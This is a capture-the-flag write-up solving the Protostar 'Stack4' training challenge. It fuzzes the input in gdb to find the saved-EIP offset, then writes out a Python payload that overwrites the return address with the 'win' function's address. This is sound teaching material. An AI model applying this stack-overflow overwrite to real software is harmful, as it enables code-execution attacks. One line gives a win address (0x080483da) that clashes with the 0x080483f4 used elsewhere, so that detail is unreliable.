---
title: Protostar - Stack 4
date: 2024-02-14 20:32:00
categories: [binary-exploitation, protostar]
tags: [protostar, binary-exploitation, stack4]
---

# Conquering Stack3 at Protostar Machine

Hello !  Today, I will solve [Stack4](https://exploit.education/protostar/stack-four/) challenge on [Protostar](https://exploit.education/protostar) machine .

This time,our mission to hijack the execuation flow and make it flow as we want , Hackers Hah XD .. 
we need to make the program exec flow change and run function called `win` .
We Love `eip` hijacking hah ;). prepair your self and your terminal and let,s go.

- this challenge requiring us to Redirect Execution to call function called `win` defined in the code useing through exploitation of stack-bufferoverflow.

### **Challenge Overview**
- **Challenge Name:** [Stack4](https://exploit.education/protostar/stack-four/)
- **Machine:** [Protostar](https://exploit.education/protostar)

### Step 1: Explore Binary
![Stack4 Explore](/assets/img/protostar/stack4-explore.png)
Again there is input ... Hmmm i think i know this function which prompt input XD .. , but i will not say :D .. you will know later :) .
### Step 2: Analysis
![Stack4 Analsis](/assets/img/protostar/stack4-analysis.png)
1. Function Prologue:
   - `push ebp`: save the base pointer.
   - `mov ebp, esp`: set up  new base pointer.
   - `and esp, 0xfffffff0`: align the stack.
   - `sub esp, 0x60`: allocate space for local variables.
2. create pointer to buffer on stack and store it in `[esp]` pointer:
- `lea eax, [esp+0x10]`: load effective address into `eax`.
- `mov DWORD PTR [esp], eax`: store the address pointed by `eax` at top of the stack.
3. Function Calls:
- `call 804830c <gets@plt>`: calling the gets function. so my friend . that is the function which i told you about ;)
4. Function Epilogue:
- `leave` restore the stack frame. it is short for `mov esp,ebp` and `pop ebp`
- `ret` return from the function. 
5. `win` function address is at `0x080483f4` 

### Step 3: Debugging

#### Theory of instruction `call`

1. first when call a function program `push` current eip address on stack 
2. then `jmp` to function which called 
3. function `push ebp` , and `mov ebp,esp` which is known as `Function Prologue` which is init stack frame
4. at the end of function when it finished it make  `Function Epilogue` which is destory stack frame by `mov esp,ebp` then `pop ebp` which is also can be shorted as `leave` instruction
5. when execute `ret` in this function which called the `eip` `pop` the first value pushed before in the stack in step 1 which represent the `eip` value which is instruction after the function called to continue execute code that after function call

Now let,s fuzz & debug ! ;)

1. create fuzz script at `~/fuzz.py` contains:
```py
fuzz="AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ"
print(fuzz)
```
2. debug binary with gdb and disassemble `main` 
3. break point at `leave` instruction in `main`
4. run binary with stdin from output of running `~/fuzz.py`
5. check fuzz value at ebp register
6. check fuzz value at eip register
![Stack4 Debug](/assets/img/protostar/stack4-gdb-debug.png)

![Stack4 Debug](/assets/img/protostar/stack4-gdb-debug2.png)
- `ebp` value now is `0x53535353` which is hexadecimal respresntation for  fuzz value `SSSS` 

![Stack4 Debug](/assets/img/protostar/stack4-gdb-debug3.png)
- and of course  `eip` value now is `0x54545454` which is hexadecimal respresntation for fuzz value `TTTT` 
- well done now let,s craft our solution

### Step 4: Crafting Solution 
okay let,s update our script: `~/fuzz.py`

```py
fuzz="AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRR"
ebp="SSSS"
eip="\xf4\x83\x04\x08" # represent 0x080483f4 on little endian machines. 0x080483f4 is address of win function
print(fuzz+ebp+eip)
```
now `eip` will have the address of `0x080483da` which is address for function `win`
let,s run our solution redirect output of `~/fuzz.py` to our beautiful binary `stack4`

![Stack4 Sloved](/assets/img/protostar/stack4-solved.png)

and now function `win` called ..

We `win` !  CheckMate ;) 


See You in [Stack5](/posts/protostar_stack5) ;)
